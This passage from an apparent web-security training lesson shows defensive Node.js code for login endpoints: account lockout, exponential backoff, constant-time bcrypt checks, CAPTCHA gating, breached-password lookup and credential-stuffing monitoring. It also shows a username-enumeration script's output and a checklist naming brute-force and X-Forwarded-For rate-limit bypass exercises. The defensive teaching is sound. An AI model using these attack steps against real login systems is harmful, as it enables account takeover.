    <span class="kw">return</span> res.<span class="fn">status</span>(<span class="num">429</span>).<span class="fn">json</span>({
      error: <span class="str">'Account temporarily locked'</span>,
      retryAfter: ttl,
    });
  }

  <span class="cmt">// Check failed attempt count</span>
  <span class="kw">const</span> failures <span class="op">=</span> <span class="fn">parseInt</span>(<span class="kw">await</span> redis.<span class="fn">get</span>(key)) <span class="op">||</span> <span class="num">0</span>;
  <span class="kw">if</span> (failures <span class="op">&gt;=</span> ACCOUNT_MAX) {
    <span class="cmt">// Lock the account</span>
    <span class="kw">await</span> redis.<span class="fn">setex</span>(lockKey, LOCKOUT_DURATION, <span class="str">'1'</span>);
    <span class="cmt">// Trigger email notification (async, don't await)</span>
    <span class="fn">notifyAccountLockout</span>(username).<span class="fn">catch</span>(console.error);
    <span class="kw">return</span> res.<span class="fn">status</span>(<span class="num">429</span>).<span class="fn">json</span>({
      error: <span class="str">'Account temporarily locked'</span>,
      retryAfter: LOCKOUT_DURATION,
    });
  }

  <span class="cmt">// Store original json method to intercept response</span>
  <span class="kw">const</span> origJson <span class="op">=</span> res.json.<span class="fn">bind</span>(res);
  res.json <span class="op">=</span> <span class="kw">function</span>(data) {
    <span class="kw">if</span> (res.statusCode <span class="op">===</span> <span class="num">401</span>) {
      <span class="cmt">// Increment failure counter on auth failure</span>
      redis.<span class="fn">multi</span>()
        .<span class="fn">incr</span>(key)
        .<span class="fn">expire</span>(key, ACCOUNT_WINDOW)
        .<span class="fn">exec</span>();
    } <span class="kw">else if</span> (data.success) {
      <span class="cmt">// Reset counter on successful login</span>
      redis.<span class="fn">del</span>(key);
    }
    <span class="kw">return</span> <span class="fn">origJson</span>(data);
  };

  <span class="fn">next</span>();
}

<span class="kw">async function</span> <span class="fn">notifyAccountLockout</span>(username) {
  <span class="cmt">// Send email to the account owner</span>
  <span class="kw">const</span> user <span class="op">=</span> <span class="kw">await</span> db.<span class="fn">findUserByUsername</span>(username);
  <span class="kw">if</span> (user <span class="op">&amp;&amp;</span> user.email) {
    <span class="kw">await</span> mailer.<span class="fn">send</span>({
      to: user.email,
      subject: <span class="str">'Security Alert: Account Locked'</span>,
      text: <span class="str">\\\`Your account was temporarily locked due to \\\${ACCOUNT_MAX} failed \\\`</span>
          <span class="op">+</span> <span class="str">\\\`login attempts. If this was not you, please change your password.\\\`</span>,
    });
  }
}

module.exports <span class="op">=</span> { ipLimiter, accountLimiter };</pre>
</div>

<div class="fix-box">
  <div class="fix-title">Fix: Exponential Backoff on Failed Attempts</div>
  <p>
    Instead of a hard lockout after N failures, you can progressively delay responses. The first
    failure is instant. The second adds a 1-second delay. The third adds 2 seconds. The fourth
    adds 4 seconds. This makes brute force exponentially slower without completely locking out
    a legitimate user who mistyped their password a couple of times.
  </p>
</div>

<div class="code-block">
  <div class="code-header">
    <span class="code-file">middleware/progressive-delay.js</span>
    <button class="code-copy">Copy</button>
  </div>
  <pre>
<span class="kw">async function</span> <span class="fn">progressiveDelay</span>(req, res, next) {
  <span class="kw">const</span> { username } <span class="op">=</span> req.body;
  <span class="kw">if</span> (!username) <span class="kw">return</span> <span class="fn">next</span>();

  <span class="kw">const</span> key <span class="op">=</span> <span class="str">\\\`login_fail:\\\${username.toLowerCase()}\\\`</span>;
  <span class="kw">const</span> failures <span class="op">=</span> <span class="fn">parseInt</span>(<span class="kw">await</span> redis.<span class="fn">get</span>(key)) <span class="op">||</span> <span class="num">0</span>;

  <span class="kw">if</span> (failures <span class="op">&gt;</span> <span class="num">0</span>) {
    <span class="cmt">// Exponential backoff: 0, 1, 2, 4, 8, 16... seconds</span>
    <span class="cmt">// Capped at 30 seconds to avoid absurd waits</span>
    <span class="kw">const</span> delayMs <span class="op">=</span> Math.<span class="fn">min</span>(
      Math.<span class="fn">pow</span>(<span class="num">2</span>, failures <span class="op">-</span> <span class="num">1</span>) <span class="op">*</span> <span class="num">1000</span>,
      <span class="num">30000</span>
    );
    <span class="kw">await</span> <span class="kw">new</span> <span class="fn">Promise</span>(resolve <span class="op">=&gt;</span> <span class="fn">setTimeout</span>(resolve, delayMs));
  }

  <span class="fn">next</span>();
}

<span class="cmt">// Effect on brute force speed:</span>
<span class="cmt">// Attempt 1:  0s delay    (instant)</span>
<span class="cmt">// Attempt 2:  1s delay    (1s total)</span>
<span class="cmt">// Attempt 3:  2s delay    (3s total)</span>
<span class="cmt">// Attempt 4:  4s delay    (7s total)</span>
<span class="cmt">// Attempt 5:  8s delay    (15s total)</span>
<span class="cmt">// Attempt 6: 16s delay    (31s total)</span>
<span class="cmt">// Attempt 7: 30s delay    (61s total)  -- capped</span>
<span class="cmt">// Attempt 8: 30s delay    (91s total)</span>
<span class="cmt">//</span>
<span class="cmt">// After 10 attempts: ~3 minutes elapsed</span>
<span class="cmt">// Without delay: 10 attempts in ~0.5 seconds</span></pre>
</div>

<div class="fix-box">
  <div class="fix-title">Fix: Constant-Time Login Response</div>
  <p>
    To defeat the timing side-channel, make sure every login request takes approximately the
    same amount of time regardless of whether the username exists. The trick is simple: always
    run <code>bcrypt.compare</code>, even when the user is not found. Compare the provided
    password against a pre-computed dummy hash. Also, return the same error message for both
    invalid username and invalid password.
  </p>
</div>

<div class="code-block">
  <div class="code-header">
    <span class="code-file">routes/login.js -- constant-time response</span>
    <button class="code-copy">Copy</button>
  </div>
  <pre>
<span class="kw">const</span> bcrypt <span class="op">=</span> <span class="fn">require</span>(<span class="str">'bcrypt'</span>);
<span class="kw">const</span> crypto <span class="op">=</span> <span class="fn">require</span>(<span class="str">'crypto'</span>);

<span class="cmt">// Pre-compute a dummy hash at startup so that</span>
<span class="cmt">// non-existent user lookups still run bcrypt.compare</span>
<span class="kw">const</span> DUMMY_HASH <span class="op">=</span> bcrypt.<span class="fn">hashSync</span>(<span class="str">'dummy-password-never-matches'</span>, <span class="num">10</span>);

app.<span class="fn">post</span>(<span class="str">'/api/login'</span>, ipLimiter, accountLimiter, progressiveDelay,
  <span class="kw">async</span> (<span class="fn">req</span>, <span class="fn">res</span>) <span class="op">=&gt;</span> {
    <span class="kw">const</span> { username, password } <span class="op">=</span> req.body;

    <span class="kw">if</span> (!username || !password) {
      <span class="kw">return</span> res.<span class="fn">status</span>(<span class="num">400</span>).<span class="fn">json</span>({ error: <span class="str">'Credentials required'</span> });
    }

    <span class="kw">try</span> {
      <span class="kw">const</span> user <span class="op">=</span> <span class="kw">await</span> db.<span class="fn">findUserByUsername</span>(username);

      <span class="cmt">// ALWAYS run bcrypt.compare -- even if user is null</span>
      <span class="cmt">// This ensures consistent response time</span>
      <span class="kw">const</span> hashToCompare <span class="op">=</span> user ? user.passwordHash : DUMMY_HASH;
      <span class="kw">const</span> match <span class="op">=</span> <span class="kw">await</span> bcrypt.<span class="fn">compare</span>(password, hashToCompare);

      <span class="kw">if</span> (!user || !match) {
        <span class="cmt">// SAME error message regardless of failure reason</span>
        <span class="kw">return</span> res.<span class="fn">status</span>(<span class="num">401</span>).<span class="fn">json</span>({ error: <span class="str">'Invalid credentials'</span> });
      }

      <span class="kw">const</span> token <span class="op">=</span> crypto.<span class="fn">randomBytes</span>(<span class="num">32</span>).<span class="fn">toString</span>(<span class="str">'hex'</span>);
      <span class="kw">await</span> db.<span class="fn">createSession</span>(user.id, token);

      res.<span class="fn">json</span>({ success: <span class="kw">true</span>, token });
    } <span class="kw">catch</span> (err) {
      res.<span class="fn">status</span>(<span class="num">500</span>).<span class="fn">json</span>({ error: <span class="str">'Internal server error'</span> });
    }
  }
);</pre>
</div>

<p>
  Let us verify the fix works by running the timing enumeration script again after applying
  the constant-time defense:
</p>

<div class="code-block">
  <div class="code-header">
    <span class="code-file">Terminal output -- after fix</span>
    <button class="code-copy">Copy</button>
  </div>
  <pre>
$ node timing-enum.js
Username Enumeration via Timing Side-Channel
==========================================

  admin           109.23ms
  root            111.45ms
  john            107.88ms
  xq7z9w2p       108.12ms
  testuser       110.34ms
  zzzfake99      109.67ms

Threshold: 109.67ms

Results:
  admin           LIKELY EXISTS
  root            LIKELY EXISTS
  john            probably fake
  xq7z9w2p        probably fake
  testuser        LIKELY EXISTS
  zzzfake99       LIKELY EXISTS</pre>
</div>

<p>
  Now every username takes approximately the same time (~108-111ms). The classifier is reduced
  to random guessing because the signal has been eliminated. The small remaining variations are
  just normal network jitter. The key changes were: (1) always calling <code>bcrypt.compare</code>
  even for non-existent users, and (2) returning a generic "Invalid credentials" message instead
  of distinguishing between invalid username and invalid password.
</p>

<hr>

<h2 class="step"><span class="step-label">Step 8</span> Deeper: Credential Stuffing Defense</h2>

<p>
  Rate-limiting handles volume. But credential stuffing is not just about volume -- it is about
  <em>quality</em>. The attacker is not guessing random passwords. They have actual
  username-password pairs from other breaches. A single attempt per account might be enough if
  the user reuses passwords. Here are the additional defenses you need beyond rate-limiting.
</p>

<p>
  <strong>CAPTCHA Integration</strong>
</p>

<p>
  After a threshold of failed attempts (say 3), require a CAPTCHA before processing the login.
  This stops automated tools cold. Use a service like hCaptcha or reCAPTCHA v3 which provides
  a risk score rather than a binary challenge, so legitimate users with good behavior scores
  never see a puzzle.
</p>

<div class="code-block">
  <div class="code-header">
    <span class="code-file">middleware/captcha.js</span>
    <button class="code-copy">Copy</button>
  </div>
  <pre>
<span class="kw">async function</span> <span class="fn">captchaGate</span>(req, res, next) {
  <span class="kw">const</span> { username } <span class="op">=</span> req.body;
  <span class="kw">const</span> key <span class="op">=</span> <span class="str">\\\`login_fail:\\\${username?.toLowerCase()}\\\`</span>;
  <span class="kw">const</span> failures <span class="op">=</span> <span class="fn">parseInt</span>(<span class="kw">await</span> redis.<span class="fn">get</span>(key)) <span class="op">||</span> <span class="num">0</span>;

  <span class="kw">if</span> (failures <span class="op">&gt;=</span> <span class="num">3</span>) {
    <span class="kw">const</span> { captchaToken } <span class="op">=</span> req.body;
    <span class="kw">if</span> (!captchaToken) {
      <span class="kw">return</span> res.<span class="fn">status</span>(<span class="num">403</span>).<span class="fn">json</span>({
        error: <span class="str">'CAPTCHA required'</span>,
        requiresCaptcha: <span class="kw">true</span>,
      });
    }

    <span class="cmt">// Verify the CAPTCHA token with the provider</span>
    <span class="kw">const</span> valid <span class="op">=</span> <span class="kw">await</span> <span class="fn">verifyCaptcha</span>(captchaToken);
    <span class="kw">if</span> (!valid) {
      <span class="kw">return</span> res.<span class="fn">status</span>(<span class="num">403</span>).<span class="fn">json</span>({ error: <span class="str">'Invalid CAPTCHA'</span> });
    }
  }

  <span class="fn">next</span>();
}

<span class="kw">async function</span> <span class="fn">verifyCaptcha</span>(token) {
  <span class="kw">const</span> res <span class="op">=</span> <span class="kw">await</span> <span class="fn">fetch</span>(<span class="str">'https://hcaptcha.com/siteverify'</span>, {
    method: <span class="str">'POST'</span>,
    headers: { <span class="str">'Content-Type'</span>: <span class="str">'application/x-www-form-urlencoded'</span> },
    body: <span class="kw">new</span> <span class="fn">URLSearchParams</span>({
      secret: process.env.HCAPTCHA_SECRET,
      response: token,
    }),
  });
  <span class="kw">const</span> data <span class="op">=</span> <span class="kw">await</span> res.<span class="fn">json</span>();
  <span class="kw">return</span> data.success;
}</pre>
</div>

<p>
  <strong>Breached Password Checking (Have I Been Pwned)</strong>
</p>

<p>
  When a user logs in successfully or sets a new password, check whether that password has
  appeared in known breaches. The Have I Been Pwned Passwords API uses a k-anonymity model:
  you hash the password with SHA-1, send only the first 5 characters of the hash, and receive
  back a list of suffixes. You check locally whether the full hash appears in the list. The
  API never sees the actual password or even the full hash.
</p>

<div class="code-block">
  <div class="code-header">
    <span class="code-file">utils/breach-check.js</span>
    <button class="code-copy">Copy</button>
  </div>
  <pre>
<span class="kw">const</span> crypto <span class="op">=</span> <span class="fn">require</span>(<span class="str">'crypto'</span>);

<span class="kw">async function</span> <span class="fn">isPasswordBreached</span>(password) {
  <span class="cmt">// SHA-1 hash the password (HIBP uses SHA-1 for its API)</span>
  <span class="kw">const</span> sha1 <span class="op">=</span> crypto.<span class="fn">createHash</span>(<span class="str">'sha1'</span>)
    .<span class="fn">update</span>(password)
    .<span class="fn">digest</span>(<span class="str">'hex'</span>)
    .<span class="fn">toUpperCase</span>();

  <span class="kw">const</span> prefix <span class="op">=</span> sha1.<span class="fn">slice</span>(<span class="num">0</span>, <span class="num">5</span>);
  <span class="kw">const</span> suffix <span class="op">=</span> sha1.<span class="fn">slice</span>(<span class="num">5</span>);

  <span class="cmt">// Only the 5-char prefix is sent to the API</span>
  <span class="kw">const</span> res <span class="op">=</span> <span class="kw">await</span> <span class="fn">fetch</span>(
    <span class="str">\\\`https://api.pwnedpasswords.com/range/\\\${prefix}\\\`</span>,
    { headers: { <span class="str">'Add-Padding'</span>: <span class="str">'true'</span> } }
  );

  <span class="kw">const</span> body <span class="op">=</span> <span class="kw">await</span> res.<span class="fn">text</span>();
  <span class="kw">const</span> lines <span class="op">=</span> body.<span class="fn">split</span>(<span class="str">'\\n'</span>);

  <span class="kw">for</span> (<span class="kw">const</span> line <span class="kw">of</span> lines) {
    <span class="kw">const</span> [hashSuffix, count] <span class="op">=</span> line.<span class="fn">split</span>(<span class="str">':'</span>);
    <span class="kw">if</span> (hashSuffix.<span class="fn">trim</span>() <span class="op">===</span> suffix) {
      <span class="kw">return</span> {
        breached: <span class="kw">true</span>,
        count: <span class="fn">parseInt</span>(count.<span class="fn">trim</span>(), <span class="num">10</span>),
      };
    }
  }

  <span class="kw">return</span> { breached: <span class="kw">false</span>, count: <span class="num">0</span> };
}

<span class="cmt">// Usage in login flow:</span>
<span class="cmt">// After successful login, check in the background</span>
<span class="cmt">// If breached, flag the account and prompt password change on next visit</span></pre>
</div>

<p>
  <strong>Monitoring for Distributed Attacks</strong>
</p>

<p>
  Even with all the per-IP and per-account limits in place, you need visibility into what is
  happening across your entire login surface. A sophisticated credential-stuffing attack might
  target thousands of accounts, with each account seeing only one or two attempts. No individual
  rate limit triggers, but the aggregate pattern is unmistakable. Build monitoring that tracks:
</p>

<div class="code-block">
  <div class="code-header">
    <span class="code-file">monitoring/login-metrics.js</span>
    <button class="code-copy">Copy</button>
  </div>
  <pre>
<span class="kw">const</span> metrics <span class="op">=</span> {
  <span class="cmt">// Track global failure rate across all accounts</span>
  <span class="fn">recordFailedLogin</span>(username, ip, userAgent) {
    <span class="cmt">// Emit to your metrics system (Prometheus, Datadog, etc.)</span>
    statsClient.<span class="fn">increment</span>(<span class="str">'login.failed'</span>, {
      tags: [<span class="str">\\\`ip_prefix:\\\${ip.split('.').slice(0,2).join('.')}\\\`</span>],
    });

    <span class="cmt">// Track unique accounts targeted per time window</span>
    redis.<span class="fn">pfadd</span>(<span class="str">'login_targets:5min'</span>, username);
    redis.<span class="fn">expire</span>(<span class="str">'login_targets:5min'</span>, <span class="num">300</span>);

    <span class="cmt">// Track unique IPs attempting logins</span>
    redis.<span class="fn">pfadd</span>(<span class="str">'login_sources:5min'</span>, ip);
    redis.<span class="fn">expire</span>(<span class="str">'login_sources:5min'</span>, <span class="num">300</span>);
  },

  <span class="kw">async</span> <span class="fn">checkForStuffingAttack</span>() {
    <span class="kw">const</span> targetCount <span class="op">=</span> <span class="kw">await</span> redis.<span class="fn">pfcount</span>(<span class="str">'login_targets:5min'</span>);
    <span class="kw">const</span> sourceCount <span class="op">=</span> <span class="kw">await</span> redis.<span class="fn">pfcount</span>(<span class="str">'login_sources:5min'</span>);

    <span class="cmt">// Alert: many accounts targeted from many IPs in a short window</span>
    <span class="cmt">// This pattern indicates credential stuffing</span>
    <span class="kw">if</span> (targetCount <span class="op">&gt;</span> <span class="num">100</span> <span class="op">&amp;&amp;</span> sourceCount <span class="op">&gt;</span> <span class="num">50</span>) {
      alerting.<span class="fn">fire</span>(<span class="str">'credential_stuffing_detected'</span>, {
        uniqueTargets: targetCount,
        uniqueSources: sourceCount,
        window: <span class="str">'5min'</span>,
      });
    }
  },
};</pre>
</div>

<div class="callout info">
  <div class="callout-title">Defense in Depth Summary</div>
  <div class="callout-text">
    No single control stops all brute-force variants. The complete defense stack is:
    (1) Correct <code>trust proxy</code> configuration to prevent IP spoofing,
    (2) Per-IP rate limiting to stop simple floods,
    (3) Per-account rate limiting to stop distributed attacks on single accounts,
    (4) Progressive delays / exponential backoff to make each subsequent attempt slower,
    (5) Account lockout with email notification for persistent attacks,
    (6) Constant-time responses to prevent username enumeration,
    (7) CAPTCHA after initial failures to stop automation,
    (8) Breached password checking to flag compromised credentials,
    (9) Aggregate monitoring to detect distributed credential stuffing.
    Each layer catches what the previous one misses.
  </div>
</div>

<hr>

<h2>Task Checklist</h2>

<ul class="task-list">
  <li><span class="task-check"></span> Build a login endpoint with no rate limiting and confirm unlimited attempts work</li>
  <li><span class="task-check"></span> Run the brute-force dictionary script and observe the speed of credential guessing</li>
  <li><span class="task-check"></span> Add express-rate-limit with <code>trust proxy: true</code> and bypass it with X-Forwarded-For rotation</li>
  <li><span class="task-check"></span> Fix trust proxy to use a numeric hop count or specific proxy IP instead of <code>true</code></li>
  <li><span class="task-check"></span> Implement per-account rate limiting using Redis counters and verify it blocks distributed attacks</li>
  <li><span class="task-check"></span> Run the timing enumeration script against the vulnerable endpoint and identify valid usernames</li>
  <li><span class="task-check"></span> Apply the constant-time fix (dummy bcrypt hash + generic error) and re-run the timing script to confirm the signal is gone</li>
  <li><span class="task-check"></span> Add CAPTCHA gating and breached password checking to the login flow</li>
</ul>

<div class="section-nav">
  <button class="nav-btn" data-prev="csp">Back: Content Security Policy</button>
  <button class="nav-btn" data-next="smuggling">Next: HTML Smuggling</button>
</div>

`;
